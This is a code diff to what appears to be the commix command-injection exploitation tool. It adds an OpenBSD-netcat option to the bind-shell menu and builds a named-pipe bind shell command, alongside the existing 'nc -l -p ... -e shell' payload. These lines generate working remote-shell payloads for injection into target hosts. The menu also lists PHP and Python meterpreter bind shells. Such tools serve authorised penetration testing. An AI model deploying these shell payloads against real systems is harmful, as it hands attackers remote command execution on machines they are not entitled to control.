@@ -171,7 +171,8 @@ def netcat_version():
   NETCAT_ALTERNATIVES = [
     "nc",
     "busybox nc",
-    "nc.traditional"
+    "nc.traditional",
+    "nc.openbsd"
   ]
 
   while True:
@@ -180,8 +181,8 @@ def netcat_version():
 Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use the default Netcat on target host.
 Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' to use Netcat for Busybox on target host.
 Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Netcat-Traditional on target host. 
-
-commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_netcat""" + Style.RESET_ALL + """) > """)
+Type '""" + Style.BRIGHT + """4""" + Style.RESET_ALL + """' to use Netcat-Openbsd on target host. 
+\ncommix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_netcat""" + Style.RESET_ALL + """) > """)
     
     # Default Netcat
     if nc_version == '1':
@@ -194,6 +195,10 @@ commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_netcat""" + Style.RESET_ALL +
     # Netcat-Traditional 
     elif nc_version == '3':
       nc_alternative = NETCAT_ALTERNATIVES[2]
+      break
+    # Netcat-Openbsd (nc without -e) 
+    elif nc_version == '4':
+      nc_alternative = NETCAT_ALTERNATIVES[3]
       break
     # Check for available shell options  
     elif any(option in nc_version.lower() for option in settings.SHELL_OPTIONS):
@@ -227,8 +232,14 @@ commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_netcat""" + Style.RESET_ALL +
       print settings.print_error_msg(err_msg)
       pass
 
-
-  cmd = nc_alternative + " -l -p " + settings.LPORT + " -e " + shell
+  if nc_version != '4':
+    # Netcat with -e
+    cmd = nc_alternative + " -l -p " + settings.LPORT + " -e " + shell
+  else:
+    # nc without -e 
+    cmd = shell + " -c \"" + shell + " 0</tmp/f | " + \
+           nc_alternative + " -l -p " + settings.LPORT + \
+           " 1>/tmp/f\""
 
   return cmd
 
@@ -247,8 +258,8 @@ Type '""" + Style.BRIGHT + """5""" + Style.RESET_ALL + """' to use a Socat bind 
 \n---[ """ + Style.BRIGHT + Fore.BLUE  + """Meterpreter bind TCP shells""" + Style.RESET_ALL + """ ]---
 Type '""" + Style.BRIGHT + """6""" + Style.RESET_ALL + """' to use a PHP meterpreter bind TCP shell.
 Type '""" + Style.BRIGHT + """7""" + Style.RESET_ALL + """' to use a Python meterpreter bind TCP shell. 
-
-commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_other""" + Style.RESET_ALL + """) > """)
+\ncommix(""" + Style.BRIGHT + Fore.RED + """bind_tcp_other""" + Style.RESET_ALL + """) > """)
+    
     # PHP-bind-shell
     if other_shell == '1':
 
@@ -445,8 +456,7 @@ def bind_tcp_options():
 ---[ """ + Style.BRIGHT + Fore.BLUE + """Bind TCP shells""" + Style.RESET_ALL + """ ]---     
 Type '""" + Style.BRIGHT + """1""" + Style.RESET_ALL + """' to use a netcat bind TCP shell.
 Type '""" + Style.BRIGHT + """2""" + Style.RESET_ALL + """' for other bind TCP shells.
-
-commix(""" + Style.BRIGHT + Fore.RED + """bind_tcp""" + Style.RESET_ALL + """) > """)
+\ncommix(""" + Style.BRIGHT + Fore.RED + """bind_tcp""" + Style.RESET_ALL + """) > """)
 
     if bind_tcp_option.lower() == "bind_tcp": 
       warn_msg = "You are already into the '" + bind_tcp_option.lower() + "' mode."
